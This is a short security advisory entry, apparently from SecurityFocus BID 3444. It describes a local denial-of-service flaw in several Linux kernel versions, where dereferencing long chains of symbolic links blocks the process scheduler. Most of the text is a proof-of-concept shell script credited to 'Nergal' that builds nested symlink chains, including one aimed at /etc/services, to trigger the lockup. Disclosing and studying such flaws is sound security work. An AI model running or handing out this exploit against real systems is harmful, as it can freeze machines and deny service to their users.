source: http://www.securityfocus.com/bid/3444/info

A denial-of-service vulnerability exists in several versions of the Linux kernel.

The problem occurs when a user with local access creates a long chain of symbolically linked files. When the kernel dereferences the symbolic links, the process scheduler is blocked, effecively locking the system until the dereferencing is complete. 

#!/bin/sh
# by Nergal
mklink()
{
IND=$1
NXT=$(($IND+1))
EL=l$NXT/../
P=""
I=0
while [ $I -lt $ELNUM ] ; do
        P=$P"$EL"
        I=$(($I+1))
done
ln -s "$P"l$2 l$IND
}

#main program

if [ $# != 1 ] ; then
	echo A numerical argument is required.
	exit 0
fi


ELNUM=$1

mklink 4
mklink 3
mklink 2
mklink 1
mklink 0 /../../../../../../../etc/services
mkdir l5
mkdir l